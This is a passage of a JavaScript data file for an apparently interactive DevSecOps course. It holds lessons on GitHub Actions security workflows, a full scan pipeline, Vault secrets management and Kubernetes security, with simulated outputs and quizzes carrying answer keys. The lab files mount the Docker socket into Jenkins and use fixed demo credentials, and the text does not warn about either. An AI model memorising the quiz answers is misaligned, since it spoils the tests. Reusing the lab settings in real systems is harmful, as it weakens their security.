            { term: 'Workflow', definition: 'A YAML file that defines the entire automation. One repo can have many workflows, each triggered by different events.' },
            { term: 'Job', definition: 'A set of steps that run on the same runner. Jobs run in parallel by default; use "needs:" for sequential ordering.' },
            { term: 'Step', definition: 'A single task — either a marketplace action (uses:) or a shell command (run:). Steps run sequentially within a job.' },
            { term: 'Action', definition: 'A reusable package from the GitHub Marketplace. Referenced as owner/repo@version (e.g., actions/checkout@v4).' },
          ]},
        ]},
        { heading: 'Key Features', blocks: [
          { type: 'text', content: 'GitHub Actions stands out with its massive marketplace ecosystem and native GitHub integration. Here are the features that matter most for DevSecOps.' },
          { type: 'scan-output', tool: 'security.yml', title: 'GitHub Actions Workflow Example', findings: [
            { type: 'header', text: 'name: Security Pipeline' },
            { type: 'finding', text: 'on: [push, pull_request]', severity: 'info' },
            { type: 'header', text: 'jobs:' },
            { type: 'finding', text: '  secrets-scan:', severity: 'medium' },
            { type: 'finding', text: '    uses: gitleaks/gitleaks-action@v2', severity: 'info' },
            { type: 'finding', text: '  sast:', severity: 'medium' },
            { type: 'finding', text: '    uses: returntocorp/semgrep-action@v1', severity: 'info' },
            { type: 'finding', text: '  container-scan:', severity: 'medium' },
            { type: 'finding', text: '    uses: aquasecurity/trivy-action@master', severity: 'info' },
            { type: 'finding', text: '    # Upload SARIF to Security tab', severity: 'low' },
            { type: 'finding', text: '    uses: github/codeql-action/upload-sarif@v3', severity: 'info' },
          ]},
          { type: 'callout', variant: 'key-concept', title: 'Marketplace Ecosystem', content: 'With 15,000+ pre-built actions, you rarely need to write scanning logic from scratch. Search the GitHub Marketplace for security actions — most popular tools (Trivy, Semgrep, Gitleaks, ZAP) publish official actions.' },
        ]},
        { heading: 'SARIF Integration', blocks: [
          { type: 'text', content: 'SARIF (Static Analysis Results Interchange Format) is the native way to display security findings in GitHub. Upload a SARIF file and findings appear in the Security tab and as inline PR annotations.' },
          { type: 'steps', steps: [
            { label: 'Run your security tool', detail: 'Configure the scan to output results in SARIF format. Most tools support this: trivy --format sarif, semgrep --sarif, etc.' },
            { label: 'Upload with CodeQL action', detail: 'Use github/codeql-action/upload-sarif@v3 with sarif_file parameter pointing to your output file.' },
            { label: 'View in Security tab', detail: 'Findings appear in the repository Security tab under "Code scanning alerts" with severity, file location, and description.' },
            { label: 'Review inline on PRs', detail: 'Pull requests show security alerts as inline annotations on the affected lines of code, making review seamless.' },
          ]},
          { type: 'callout', variant: 'tip', content: 'Always use "if: always()" on the SARIF upload step. This ensures findings are uploaded even when the scan step fails (finds vulnerabilities), so you still get visibility into what was found.' },
        ]},
        { heading: 'Comparison', blocks: [
          { type: 'comparison', items: [
            { title: 'GitHub Actions', color: '#3B82F6', points: [
              'Built into GitHub — zero setup',
              '15,000+ marketplace actions',
              'SARIF integration for security findings',
              'Matrix builds for multi-OS testing',
              'Best for: GitHub-centric teams, open-source',
            ]},
            { title: 'GitLab CI', color: '#F97316', points: [
              'Built into GitLab — zero setup',
              'Built-in security templates (SAST, DAST, SCA)',
              'MR security widget for findings',
              'Auto DevOps for zero-config',
              'Best for: GitLab-centric teams, enterprise',
            ]},
            { title: 'Jenkins', color: '#A78BFA', points: [
              'Separate server — more setup, more control',
              '2,000+ plugins for any integration',
              'Groovy scripting for complex logic',
              'Self-hosted — full data sovereignty',
              'Best for: complex enterprise pipelines',
            ]},
          ]},
          { type: 'callout', variant: 'example', title: 'Choosing the Right Tool', content: 'Use GitHub Actions if your code lives in GitHub and you want the simplest setup. Use GitLab CI if you need built-in security templates and an all-in-one platform. Use Jenkins if you need maximum flexibility or have complex enterprise requirements.' },
        ]},
      ],
    },
    simulation: {
      title: 'GitHub Actions Workflow',
      scenario: "Write a GitHub Actions security workflow.",
      files: {
        '.github/workflows/': {
          'security.yml': 'name: Security Pipeline\n\non:\n  push:\n    branches: [main]\n  pull_request:\n    branches: [main]\n\njobs:\n  secrets-scan:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          fetch-depth: 0\n      - uses: gitleaks/gitleaks-action@v2\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n\n  sast:\n    runs-on: ubuntu-latest\n    needs: [secrets-scan]\n    steps:\n      - uses: actions/checkout@v4\n      - uses: returntocorp/semgrep-action@v1\n        with:\n          config: auto\n\n  container-scan:\n    runs-on: ubuntu-latest\n    needs: [sast]\n    steps:\n      - uses: actions/checkout@v4\n      - name: Build image\n        run: docker build -t myapp:${{ github.sha }} .\n      - name: Trivy scan\n        uses: aquasecurity/trivy-action@master\n        with:\n          image-ref: myapp:${{ github.sha }}\n          severity: CRITICAL,HIGH\n          exit-code: 1\n          format: sarif\n          output: trivy-results.sarif\n      - name: Upload SARIF\n        uses: github/codeql-action/upload-sarif@v3\n        with:\n          sarif_file: trivy-results.sarif',
        },
      },
      steps: [
        { objective: 'Understand workflow triggers', command: 'grep -A4 "on:" security.yml', output: 'on:\n  push:\n    branches: [main]\n  pull_request:\n    branches: [main]', followUp: 'What events trigger this workflow?', answer: 'push and pull_request to main', hint: 'The "on:" section defines triggers' },
        { objective: 'Understand job dependencies', command: 'grep "needs:" security.yml', output: '    needs: [secrets-scan]\n    needs: [sast]', followUp: 'In what order do the jobs run?', answer: 'secrets-scan, then sast, then container-scan', hint: 'The "needs:" keyword creates dependencies between jobs' },
        { objective: 'Find the marketplace actions used', command: 'grep "uses:" security.yml', output: '      - uses: actions/checkout@v4\n      - uses: gitleaks/gitleaks-action@v2\n      - uses: actions/checkout@v4\n      - uses: returntocorp/semgrep-action@v1\n      - uses: actions/checkout@v4\n      - uses: aquasecurity/trivy-action@master\n      - uses: github/codeql-action/upload-sarif@v3', followUp: 'How many unique marketplace actions are used?', answer: '5', hint: 'Count unique action names: checkout, gitleaks-action, semgrep-action, trivy-action, upload-sarif' },
        { objective: 'Understand SARIF upload', command: 'grep -A3 "Upload SARIF" security.yml', output: '      - name: Upload SARIF\n        uses: github/codeql-action/upload-sarif@v3\n        with:\n          sarif_file: trivy-results.sarif', followUp: 'Where do SARIF results appear in GitHub?', answer: 'Security tab', hint: 'SARIF uploads show in the GitHub Security tab and as inline PR annotations' },
      ],
    },
    execute: { intro: 'Study the workflow YAML structure.', commands: [{ cmd: 'echo "Review the workflow file structure"', desc: 'Key: understand triggers, jobs, needs, steps, and marketplace actions.' }] },
    verify: ['Name one marketplace action for Trivy scanning', 'What action uploads SARIF to GitHub Security tab?'],
    quiz: [
      { q: "What is a GitHub Actions marketplace action?", opts: ["A paid service", "A reusable, pre-built step you can include in your workflow", "A GitHub feature flag", "A deployment target"], answer: 1, explanation: "Marketplace actions are reusable workflow steps published by the community. They encapsulate common tasks (checkout, scan, deploy) into simple YAML references." },
      { q: "What does 'needs: [secrets-scan]' do?", opts: ["Deletes the secrets-scan job", "Makes this job wait for secrets-scan to complete before starting", "Runs in parallel with secrets-scan", "Skips if secrets-scan fails"], answer: 1, explanation: "'needs' creates a dependency — this job won't start until the specified jobs complete successfully." },
      { q: "How does GitHub display SARIF-uploaded security findings?", opts: ["In a separate app", "In the Security tab and as inline annotations on Pull Requests", "Only in email", "In Slack"], answer: 1, explanation: "SARIF results appear in the repo's Security tab and as inline code annotations on affected lines in Pull Requests." },
      { q: "What does 'fetch-depth: 0' do in actions/checkout?", opts: ["Downloads 0 files", "Fetches the complete git history (all commits)", "Only fetches the latest commit", "Skips checkout"], answer: 1, explanation: "fetch-depth: 0 clones the full git history, which is needed for tools like Gitleaks that scan commit history for secrets." },
      { q: "When should you use GitHub Actions vs Jenkins?", opts: ["Always use Jenkins", "GitHub Actions for GitHub-centric teams and simpler pipelines; Jenkins for complex enterprise needs", "Always use GitHub Actions", "They can't coexist"], answer: 1, explanation: "GitHub Actions is ideal for GitHub-native workflows with its huge marketplace. Jenkins offers more flexibility for complex enterprise requirements." },
    ],
  },
  '3.5': {
    id: '3.5', pathId: 3, title: 'Building a Complete Pipeline', baseXP: 150, estTime: '20-35 min',
    hasSim: true, hasExecute: true, hasVerify: true,
    theory: {
      sections: [
        { heading: 'End-to-End Architecture', blocks: [
          { type: 'text', content: 'A complete DevSecOps pipeline layers security checks at every stage, from the developer\'s machine all the way to production. Each stage catches different categories of vulnerabilities, creating defense in depth.' },
          { type: 'pipeline', stages: [
            { label: 'Pre-commit', icon: '🔑', desc: 'Secrets detection', security: true, tool: 'gitleaks' },
            { label: 'Build', icon: '🔍', desc: 'SAST + SCA + Lint', security: true, tool: 'semgrep' },
            { label: 'Test', icon: '🧪', desc: 'Unit + integration', security: false, tool: 'pytest' },
            { label: 'Image Build', icon: '🐳', desc: 'Container scan', security: true, tool: 'trivy' },
            { label: 'Staging', icon: '🌐', desc: 'DAST scan', security: true, tool: 'ZAP' },
            { label: 'Policy Gate', icon: '🛡️', desc: 'Pass/fail decision', security: true, tool: 'OPA' },
            { label: 'Production', icon: '🚀', desc: 'Deploy if clear', security: false, tool: 'kubectl' },
          ]},
          { type: 'callout', variant: 'key-concept', title: 'Defense in Depth', content: 'No single scan catches everything. SAST finds code bugs, SCA finds vulnerable dependencies, container scanning finds OS-level issues, DAST finds runtime vulnerabilities. Together they provide comprehensive coverage.' },
        ]},
        { heading: 'Tool Selection', blocks: [
          { type: 'text', content: 'Choosing the right tool for each scan type is critical. Here is a proven, open-source toolkit that covers all major attack vectors in a DevSecOps pipeline.' },
          { type: 'comparison', items: [
            { title: 'Code & Dependencies', color: '#3B82F6', points: [
              'Secrets: Gitleaks — pre-commit hook + CI scan',
              'SAST: Semgrep — fast, multi-language, custom rules',
              'SCA: Trivy — scans dependencies for known CVEs',
              'IaC: Checkov — Terraform, CloudFormation, K8s',
            ]},
            { title: 'Containers & Runtime', color: '#22C55E', points: [
              'Dockerfile Lint: Hadolint — best practices enforcement',
              'Image Scan: Trivy — OS packages + app dependencies',
              'DAST: ZAP — scans running applications for vulns',
              'Runtime: Falco — detects anomalous container behavior',
            ]},
          ]},
          { type: 'scan-output', tool: 'run-all-scans.sh', title: 'Full Scan Suite Output', findings: [
            { type: 'header', text: '=== DevSecOps Full Scan Suite ===' },
            { type: 'finding', text: '[1/5] Secrets Detection ............ PASSED (0 leaks)', severity: 'low' },
            { type: 'finding', text: '[2/5] SAST Scan ................... 3 findings', severity: 'medium' },
            { type: 'finding', text: '[3/5] SCA Scan .................... 7 vulnerable deps', severity: 'high' },
            { type: 'finding', text: '[4/5] Dockerfile Lint ............. 2 warnings', severity: 'medium' },
            { type: 'finding', text: '[5/5] Container Image Scan ........ 1 CRITICAL', severity: 'critical' },
            { type: 'summary', text: 'Total: 13 findings across 5 scans. 1 CRITICAL blocks deployment.' },
          ]},
        ]},
        { heading: 'Scan Ordering', blocks: [
          { type: 'text', content: 'Run fast scans first and slow scans later. This gives developers the quickest possible feedback on the easiest-to-fix issues. A leaked secret can be caught in seconds; a DAST scan takes 30 minutes.' },
          { type: 'severity-bars', title: 'Scan Duration by Type', items: [
            { rank: 1, label: 'Secrets Detection', count: 5, color: '#22C55E' },
            { rank: 2, label: 'SAST (Semgrep)', count: 15, color: '#3B82F6' },
            { rank: 3, label: 'SCA (Trivy fs)', count: 15, color: '#3B82F6' },
            { rank: 4, label: 'Dockerfile Lint', count: 5, color: '#22C55E' },
            { rank: 5, label: 'Container Scan', count: 30, color: '#F59E0B' },
            { rank: 6, label: 'DAST (ZAP)', count: 100, color: '#EF4444' },
          ]},
          { type: 'attack-flow', steps: [
            { type: 'defense', label: 'Seconds', detail: 'Secrets detection runs first — catches leaked credentials instantly. Fastest scan, most critical issue type.' },
            { type: 'defense', label: 'Minutes', detail: 'SAST and SCA run in parallel — find code vulnerabilities and vulnerable dependencies. Medium speed, high value.' },
            { type: 'defense', label: 'Minutes', detail: 'Container image scan after build — finds OS-level vulnerabilities in the packaged artifact.' },
            { type: 'info', label: '5-30 min', detail: 'DAST runs after staging deployment — tests the running application for runtime vulnerabilities. Slowest but catches issues no other scan can find.' },
          ]},
        ]},
        { heading: 'Metrics', blocks: [
          { type: 'text', content: 'Metrics prove the value of your DevSecOps program and guide continuous improvement. Without measurement, you cannot demonstrate ROI or identify weak spots.' },
          { type: 'keyterms', terms: [
            { term: 'MTTR', definition: 'Mean Time to Remediate — average time from vulnerability discovery to fix, tracked by severity. Target: Critical < 24h, High < 7 days.' },
            { term: 'Scan Coverage', definition: 'Percentage of repositories with automated security scans enabled. Target: 100% of production repos.' },
            { term: 'False Positive Rate', definition: 'Percentage of reported findings that are not real issues. High FP rates cause alert fatigue. Target: < 15%.' },
            { term: 'Developer Adoption', definition: 'Percentage of developers using pre-commit hooks and security tools locally. Measures shift-left culture adoption.' },
          ]},
          { type: 'callout', variant: 'tip', content: 'Create a security dashboard that tracks these metrics over time. Show trends monthly. When MTTR goes down and scan coverage goes up, you are proving DevSecOps ROI to leadership.' },
        ]},
      ],
    },
    simulation: {
      title: 'Full Pipeline Design',
      scenario: "Design and implement a complete DevSecOps pipeline using Docker Compose.",
      files: {
        'full-pipeline/': {
          'docker-compose.yml': 'version: "3"\nservices:\n  app:\n    build: .\n    ports: ["3000:3000"]\n  jenkins:\n    image: jenkins/jenkins:lts\n    ports: ["8080:8080"]\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock',
          'run-all-scans.sh': '#!/bin/bash\nset -e\necho "=== DevSecOps Full Scan Suite ==="\necho ""\necho "[1/5] Secrets Detection"\ngitleaks detect -v --report-format json --report-path reports/gitleaks.json\necho ""\necho "[2/5] SAST Scan"\nsemgrep scan --config auto --json -o reports/semgrep.json\necho ""\necho "[3/5] SCA Scan"\ntrivy fs . --scanners vuln --format json -o reports/trivy-sca.json\necho ""\necho "[4/5] Dockerfile Lint"\nhadolint Dockerfile --format json > reports/hadolint.json\necho ""\necho "[5/5] Container Image Scan"\ntrivy image --format json -o reports/trivy-image.json myapp:latest\necho ""\necho "=== All scans complete. Reports in ./reports/ ==="',
        },
      },
      steps: [
        { objective: 'Review the full scan script', command: 'cat run-all-scans.sh', output: '(Script displayed)', followUp: 'How many different scans does the script run?', answer: '5', hint: 'Count the numbered steps: 1/5 through 5/5' },
        { objective: 'Understand scan ordering', command: 'grep "echo.*/" run-all-scans.sh', output: '[1/5] Secrets Detection\n[2/5] SAST Scan\n[3/5] SCA Scan\n[4/5] Dockerfile Lint\n[5/5] Container Image Scan', followUp: 'Why are secrets scanned first?', answer: 'fastest scan, catches the most critical issue first', hint: 'Secrets detection is the fastest scan and committed credentials are the most urgent issue' },
        { objective: 'Check report outputs', command: 'ls reports/', output: 'gitleaks.json\nsemgrep.json\ntrivy-sca.json\nhadolint.json\ntrivy-image.json', followUp: 'What format are all reports in?', answer: 'json', hint: 'All reports use JSON format for programmatic processing' },
        { objective: 'Review the docker-compose setup', command: 'cat docker-compose.yml', output: '(docker-compose displayed)', followUp: 'What services does the lab include?', answer: 'app and jenkins', hint: 'Two services: the application and Jenkins CI server' },
      ],
    },
    execute: {
      intro: 'Build and run a complete DevSecOps scanning suite.',
      commands: [
        { cmd: 'mkdir -p reports', desc: 'Create reports directory.' },
        { cmd: 'chmod +x run-all-scans.sh && ./run-all-scans.sh', desc: 'Run all security scans.' },
        { cmd: 'ls -la reports/', desc: 'Check all generated reports.' },
      ],
    },
    verify: ['How many total findings across all tools when scanning your project?', 'Which tool found the most issues?'],
    quiz: [
      { q: "What's the recommended order for security scans in a pipeline?", opts: ["Random order", "Slowest first", "Fastest first (secrets → SAST → SCA → image scan → DAST)", "DAST first"], answer: 2, explanation: "Fast scans first gives quick feedback. Secrets detection takes seconds, SAST/SCA take minutes, DAST takes much longer." },
      { q: "What metric measures how quickly you fix vulnerabilities?", opts: ["MTBF", "MTTR (Mean Time to Remediate)", "MTTD", "SLA"], answer: 1, explanation: "MTTR (Mean Time to Remediate) measures the average time from vulnerability discovery to fix. Track by severity level." },
      { q: "Why use JSON format for all scan reports?", opts: ["It's smaller", "It enables programmatic processing, aggregation, and integration with dashboards", "It's the only format tools support", "It's more readable"], answer: 1, explanation: "JSON reports can be parsed programmatically to aggregate findings, generate dashboards, trigger alerts, and track trends over time." },
      { q: "A complete DevSecOps pipeline should include scans for:", opts: ["Only source code", "Source code, dependencies, containers, infrastructure, and running applications", "Only containers", "Only after production deployment"], answer: 1, explanation: "Complete coverage requires scanning at every layer: secrets, source code (SAST), dependencies (SCA), containers, IaC, and running applications (DAST)." },
      { q: "What's the false positive rate and why does it matter?", opts: ["It doesn't matter", "The percentage of reported findings that aren't real issues — high FP rates cause developer fatigue", "The rate of failing builds", "The speed of scanning"], answer: 1, explanation: "False positives are reported findings that aren't actual vulnerabilities. High FP rates lead to alert fatigue where developers start ignoring all findings." },
    ],
  },
  '4.1': {
    id: '4.1', pathId: 4, title: 'Secrets Management with Vault', baseXP: 200, estTime: '20-35 min',
    hasSim: true, hasExecute: true, hasVerify: true,
    theory: {
      sections: [
        { heading: 'Why Secrets Management', blocks: [
          { type: 'text', content: 'Hardcoded secrets in code, environment variables, and config files are the #1 cause of breaches. A secrets manager provides centralized, audited, access-controlled storage for credentials.' },
          { type: 'callout', variant: 'warning', title: 'The Hard Truth', content: 'Over 6 million secrets are detected on public GitHub repos every year. Bots scan for exposed credentials in real-time and can exploit them within minutes of exposure.' },
          { type: 'scan-output', tool: 'gitleaks', title: 'Secrets Found in Codebase', findings: [
            { type: 'header', text: 'Gitleaks scan results — 3 secrets detected' },
            { type: 'finding', text: 'AWS Access Key ID found in config.py', severity: 'CRITICAL', file: 'src/config.py:12' },
            { type: 'finding', text: 'Database password in docker-compose.yml', severity: 'HIGH', file: 'docker-compose.yml:8' },
            { type: 'finding', text: 'API token in .env committed to repo', severity: 'HIGH', file: '.env:3' },
            { type: 'summary', text: '3 findings (1 Critical, 2 High) — all must be rotated immediately' },
          ]},
        ]},
        { heading: 'Vault Architecture', blocks: [
          { type: 'text', content: 'HashiCorp Vault is a secrets management tool that stores, generates, encrypts, and audits access to secrets.' },
          { type: 'diagram', variant: 'linear', nodes: [
            { label: 'Client', note: 'App or human requests secret' },
            { label: 'Auth Method', note: 'Verify identity (AppRole, K8s, OIDC)' },
            { label: 'Policy Check', note: 'Evaluate ACL permissions' },
            { label: 'Secrets Engine', note: 'Generate or retrieve secret' },
            { label: 'Audit Log', note: 'Record every access event' },
          ]},
          { type: 'keyterms', terms: [
            { term: 'Storage Backend', definition: 'Where encrypted data lives (Consul, Raft, S3). Vault encrypts before writing.' },
            { term: 'Barrier', definition: 'Encryption layer protecting all data at rest. Must be unsealed before Vault operates.' },
            { term: 'Secrets Engines', definition: 'Plugins that generate or store secrets (KV, database, PKI, AWS, transit).' },
            { term: 'Auth Methods', definition: 'Plugins that verify identity (Token, AppRole, LDAP, OIDC, Kubernetes).' },
            { term: 'Audit Devices', definition: 'Log every request and response. Critical for compliance and forensics.' },
          ]},
        ]},
        { heading: 'Static vs Dynamic Secrets', blocks: [
          { type: 'comparison', items: [
            { title: 'Static Secrets', color: '#F59E0B', points: [
              'Stored values you put in (API keys, passwords)',
              'Shared across consumers — one leak affects all',
              'Must be manually rotated',
              'No automatic expiration',
              'Example: database password in KV store',
            ]},
            { title: 'Dynamic Secrets', color: '#22C55E', points: [
              'Generated on-demand with a TTL',
              'Each consumer gets unique credentials',
              'Auto-expire — reduced blast radius',
              'Vault handles creation and revocation',
              'Example: short-lived DB creds via database engine',
            ]},
          ]},
          { type: 'callout', variant: 'key-concept', title: 'Why Dynamic Secrets Win', content: 'Dynamic secrets are more secure because each consumer gets unique, short-lived credentials. If one is compromised, only that single credential is affected and it expires automatically.' },
        ]},
        { heading: 'Auth Methods & Policies', blocks: [
          { type: 'text', content: 'Auth methods verify identity. Policies define what paths a token can access and what operations are allowed (read, write, list, delete). Principle of least privilege.' },
          { type: 'pipeline', stages: [
            { label: 'Identity', icon: 'User', desc: 'Who is requesting access?', security: true, tool: 'AppRole / K8s / OIDC' },
            { label: 'Authenticate', icon: 'Lock', desc: 'Verify credentials are valid', security: true, tool: 'Vault Auth Method' },
            { label: 'Token', icon: 'Key', desc: 'Issue token with attached policies', security: true, tool: 'Vault Token' },
            { label: 'Authorize', icon: 'Shield', desc: 'Check policy against requested path', security: true, tool: 'HCL Policy' },
            { label: 'Access', icon: 'Database', desc: 'Read/write secret if permitted', security: false, tool: 'Secrets Engine' },
          ]},
          { type: 'scan-output', tool: 'vault', title: 'Vault Policy Example', findings: [
            { type: 'header', text: 'policy.hcl — app-readonly policy' },
            { type: 'finding', text: 'path "secret/data/app/*" → capabilities = ["read", "list"]', severity: 'INFO' },
            { type: 'finding', text: 'path "secret/data/admin/*" → capabilities = ["deny"]', severity: 'INFO' },
            { type: 'summary', text: 'Least privilege: app can read its own secrets, denied access to admin secrets' },
          ]},
        ]},
        { heading: 'Secret Rotation', blocks: [
          { type: 'text', content: 'Secrets should be rotated regularly. Vault can auto-rotate dynamic secrets via TTLs. For static secrets, establish rotation schedules. Leaked secrets must be rotated immediately — revoke first, then rotate.' },
          { type: 'steps', steps: [
            { label: 'Detect the leak', detail: 'Gitleaks, TruffleHog, or GitHub push protection flags the exposed secret.' },
            { label: 'Revoke immediately', detail: 'Disable the compromised credential in the provider (AWS, DB, API). Do not wait.' },
            { label: 'Rotate', detail: 'Generate a new credential and update all consumers via Vault or secrets manager.' },
            { label: 'Audit', detail: 'Check access logs for unauthorized usage during the exposure window.' },
            { label: 'Prevent', detail: 'Add pre-commit hooks and CI scanning to catch future leaks before they happen.' },
          ]},
        ]},
      ],
    },
    simulation: {
      title: 'Vault Operations',
      scenario: 'Set up Vault, store application secrets, and configure least-privilege access for a development team.',
      files: {
        'vault-lab/': {
          'policy.hcl': 'path "secret/data/app/*" {\n  capabilities = ["read", "list"]\n}\n\npath "secret/data/admin/*" {\n  capabilities = ["deny"]\n}',
          'app-config.yaml': 'database:\n  host: db.internal\n  port: 5432\n  # credentials fetched from Vault at runtime\n  vault_path: secret/data/app/db',
        },
      },
      steps: [
        { objective: 'Check Vault server status', command: 'vault status', output: 'Key             Value\n---             -----\nSeal Type       shamir\nInitialized     true\nSealed          false\nTotal Shares    1\nThreshold       1\nVersion         1.15.4\nCluster Name    vault-cluster-abc123', followUp: 'Is the Vault server sealed or unsealed?', answer: 'unsealed', hint: 'Look at the Sealed field in the output' },
        { objective: 'Store a database secret', command: 'vault kv put secret/app/db username=dbadmin password=SuperSecret123', output: '====== Secret Path ======\nsecret/data/app/db\n\n======= Metadata =======\nKey                Value\n---                -----\ncreated_time       2026-03-22T10:30:00.000Z\nversion            1', followUp: 'What version number was this secret stored as?', answer: '1', hint: 'Check the version in the Metadata section' },
        { objective: 'Retrieve the stored secret', command: 'vault kv get secret/app/db', output: '====== Secret Path ======\nsecret/data/app/db\n\n======= Metadata =======\nKey                Value\n---                -----\ncreated_time       2026-03-22T10:30:00.000Z\nversion            1\n\n====== Data ======\nKey         Value\n---         -----\npassword    SuperSecret123\nusername    dbadmin', followUp: 'What is the stored password value?', answer: 'SuperSecret123', hint: 'Look in the Data section' },
        { objective: 'Retrieve only the password field', command: 'vault kv get -field=password secret/app/db', output: 'SuperSecret123', followUp: 'Why retrieve a single field instead of the full secret?', answer: 'to avoid exposing other fields and simplify scripting', hint: 'Minimizes exposure and makes it easy to use in scripts/env vars' },
        { objective: 'Apply a least-privilege policy', command: 'vault policy write app-readonly policy.hcl', output: 'Success! Uploaded policy: app-readonly', followUp: 'What capabilities does the policy grant on app/* path?', answer: 'read and list', hint: 'Check the capabilities in policy.hcl' },
        { objective: 'Enable AppRole authentication for machines', command: 'vault auth enable approle', output: 'Success! Enabled approle auth method at: approle/', followUp: 'Why use AppRole instead of a token for applications?', answer: 'AppRole provides machine-friendly auth with role-based access and renewable tokens', hint: 'AppRole is designed for machine-to-machine authentication with role binding' },
        { objective: 'Verify the policy blocks admin access', command: 'vault kv get secret/admin/keys', output: 'Error reading secret/admin/keys: 1 error occurred:\n* permission denied', followUp: 'Did the policy correctly deny access to admin secrets? (yes/no)', answer: 'yes', hint: 'The policy has deny on secret/data/admin/*' },
      ],
    },
    execute: {
      intro: 'Set up Vault locally with Docker and practice secrets management.',
      commands: [
        { cmd: 'docker run -d --name vault -p 8200:8200 -e VAULT_DEV_ROOT_TOKEN_ID=myroot -e VAULT_ADDR=http://0.0.0.0:8200 hashicorp/vault:latest', desc: 'Start Vault in dev mode with a known root token.' },
        { cmd: 'export VAULT_ADDR=http://127.0.0.1:8200 && export VAULT_TOKEN=myroot', desc: 'Set Vault env vars.' },
        { cmd: 'vault status', desc: 'Verify Vault is running and unsealed.' },
        { cmd: 'vault kv put secret/app/db username=dbadmin password=SuperSecret123', desc: 'Store a database credential.' },
        { cmd: 'vault kv get secret/app/db', desc: 'Retrieve the full secret.' },
        { cmd: 'vault kv get -field=password secret/app/db', desc: 'Retrieve only the password.' },
        { cmd: 'vault policy write app-readonly policy.hcl', desc: 'Apply a least-privilege policy.' },
        { cmd: 'vault policy list', desc: 'List all policies.' },
        { cmd: 'vault auth enable approle', desc: 'Enable AppRole for machine auth.' },
      ],
    },
    verify: ['What version of Vault are you running? (vault version)', 'What policies are listed when you run vault policy list?'],
    quiz: [
      { q: "What is the main advantage of dynamic secrets over static secrets?", opts: ["They're easier to type", "Each consumer gets unique, short-lived credentials that auto-expire", "They're stored in plain text", "They don't need encryption"], answer: 1, explanation: "Dynamic secrets are generated on-demand with a TTL. Each application gets unique credentials that automatically expire, limiting blast radius if compromised." },
      { q: "What auth method is recommended for applications (machines)?", opts: ["Username/password", "AppRole", "LDAP", "Social login"], answer: 1, explanation: "AppRole is designed for machine-to-machine authentication. It uses a RoleID and SecretID pair, supporting role-based policies and renewable tokens." },
      { q: "What does 'least privilege' mean in Vault policies?", opts: ["Give everyone admin access", "Grant only the minimum permissions needed for the task", "Use the least number of policies", "Disable all access by default"], answer: 1, explanation: "Least privilege means each identity gets only the permissions it needs — read-only access to specific paths, no broader access." },
      { q: "When a secret is leaked, what should you do FIRST?", opts: ["Delete the code that contains it", "Revoke/rotate the compromised secret immediately", "Run a security scan", "Notify management"], answer: 1, explanation: "The first priority is always to revoke/rotate the compromised credential. Even if you clean up the code, the secret may already be captured by attackers." },
      { q: "Why is storing secrets in environment variables not ideal?", opts: ["They're too slow", "Env vars can leak through logs, error messages, child processes, and aren't audited", "They don't work on Linux", "They take up too much memory"], answer: 1, explanation: "Environment variables can leak through process listings, debug endpoints, crash dumps, log aggregation, and child process inheritance. A secrets manager provides audit trails and access control." },
    ],
  },
  '4.2': {
    id: '4.2', pathId: 4, title: 'Kubernetes Security', baseXP: 200, estTime: '20-35 min',
    hasSim: true, hasExecute: true, hasVerify: true,
    theory: {
      sections: [
        { heading: 'The 4C Model of Cloud-Native Security', blocks: [
          { type: 'text', content: 'Cloud-native security uses a layered defense model. Each layer builds on the one below — if a lower layer is compromised, all layers above are at risk.' },
          { type: 'diagram', variant: 'linear', nodes: [
            { label: 'Cloud', note: 'Infrastructure security (IAM, network, encryption)' },
            { label: 'Cluster', note: 'K8s API, RBAC, NetworkPolicies, admission control' },
            { label: 'Container', note: 'Image scanning, runtime security, least privilege' },
            { label: 'Code', note: 'SAST, SCA, secrets detection, secure coding' },
          ]},
          { type: 'callout', variant: 'key-concept', title: 'Defense in Depth', content: 'Security must be addressed at every level. A hardened container running on an insecure cluster is still vulnerable. The 4C model ensures no layer is neglected.' },
        ]},
        { heading: 'Pod Security Standards', blocks: [
          { type: 'text', content: 'Kubernetes 1.25+ enforces Pod Security Standards via namespace labels. Three levels control what pods can do.' },
          { type: 'comparison', items: [
            { title: 'Privileged', color: '#EF4444', points: [
              'Unrestricted — no security constraints',
              'For system-level workloads (CNI, storage drivers)',
              'Can access host namespaces and devices',
              'Should be limited to kube-system namespace',
            ]},
            { title: 'Baseline', color: '#F59E0B', points: [
              'Prevents known privilege escalations',
              'No privileged containers or hostNetwork',
              'No hostPID or hostIPC',
              'Good default for most workloads',
            ]},
            { title: 'Restricted', color: '#22C55E', points: [
              'Heavily hardened, best practices enforced',
              'Must run as non-root, drop ALL capabilities',
              'Read-only root filesystem required',
              'Seccomp profile must be set',
            ]},
          ]},
          { type: 'scan-output', tool: 'kubeaudit', title: 'Pod Security Audit', findings: [
            { type: 'header', text: 'kubeaudit all -f insecure-deploy.yaml' },
            { type: 'finding', text: 'Container "app" is privileged', severity: 'CRITICAL', file: 'insecure-deploy.yaml' },
            { type: 'finding', text: 'Container "app" runs as root (UID 0)', severity: 'CRITICAL', file: 'insecure-deploy.yaml' },
            { type: 'finding', text: 'Container "app" allows privilege escalation', severity: 'HIGH', file: 'insecure-deploy.yaml' },
            { type: 'finding', text: 'Container "app" does not drop all capabilities', severity: 'MEDIUM', file: 'insecure-deploy.yaml' },
            { type: 'summary', text: '4 findings (2 Critical, 1 High, 1 Medium)' },
          ]},
        ]},
        { heading: 'RBAC — Role-Based Access Control', blocks: [
          { type: 'text', content: 'RBAC controls who can do what in the cluster. Roles define permissions (verbs on resources). RoleBindings attach roles to users or service accounts.' },
          { type: 'pipeline', stages: [
            { label: 'User/SA', icon: 'User', desc: 'Identity making the API request', security: false, tool: 'ServiceAccount' },
            { label: 'Authentication', icon: 'Lock', desc: 'Verify identity (certs, tokens, OIDC)', security: true, tool: 'K8s Auth' },
            { label: 'Authorization', icon: 'Shield', desc: 'RBAC check: does this identity have permission?', security: true, tool: 'RBAC' },
            { label: 'Admission', icon: 'AlertTriangle', desc: 'Policy check (OPA, Kyverno)', security: true, tool: 'Admission Controller' },
            { label: 'Persist', icon: 'Database', desc: 'Resource created in etcd', security: false, tool: 'etcd' },
          ]},
          { type: 'callout', variant: 'tip', title: 'Least Privilege in RBAC', content: 'Use Role/RoleBinding (namespace-scoped) instead of ClusterRole/ClusterRoleBinding whenever possible. Never grant cluster-admin to application service accounts.' },
